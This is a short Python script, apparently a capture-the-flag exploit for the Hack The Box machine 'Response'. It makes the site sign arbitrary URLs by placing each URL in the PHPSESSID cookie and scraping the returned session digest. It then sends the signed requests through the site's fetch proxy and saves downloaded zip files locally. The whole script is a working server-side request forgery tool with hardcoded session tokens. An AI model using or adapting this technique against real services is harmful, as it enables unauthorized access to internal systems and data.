from requests import *
import json
import base64
import urllib
from cmd import Cmd

url = "http://api.response.htb/"
url_digest = "cab532f75001ed2cc94ada92183d2160319a328e67001a9215956a5dbf10c545"


def get(url, url_digest):
    data = {
        "url": url,
        "url_digest": url_digest,
        "method": "GET",
        "session": "5f7bf45b02c832cf5b40c15ab6d365af",
        "session_digest": "a2b9ac69ab85795d13d12857a709a024cd729dcdf2c3fd3bb21ed514bc9990ac"
    }
    headers = {'Content-Type': 'application/json'}
    url_proxy = "http://proxy.response.htb/fetch"
    s = Session()
    res = s.post(url_proxy, json=data, headers=headers)
    body = json.loads(res.text)['body']
    body = base64.b64decode(body)
    if "zip" in url:
        f = open("src/file.zip", "wb")
        f.write(body)
        f.close()
        print("Done saving file :-) ")
    else:
        print(body)


def url_de(url):
    s = Session()
    res = s.get('http://www.response.htb/status/main.js.php', cookies={'PHPSESSID': url})
    x = res.text.find("session_digest':'")
    y = res.text.find("'};")
    return res.text[x + 17:y]


class pr(Cmd):
    prompt = "==>  "

    def default(self, url):
        url_digest = url_de(url)
        get(url, url_digest)

    def do_exit(self, a):
        exit()


pr().cmdloop()
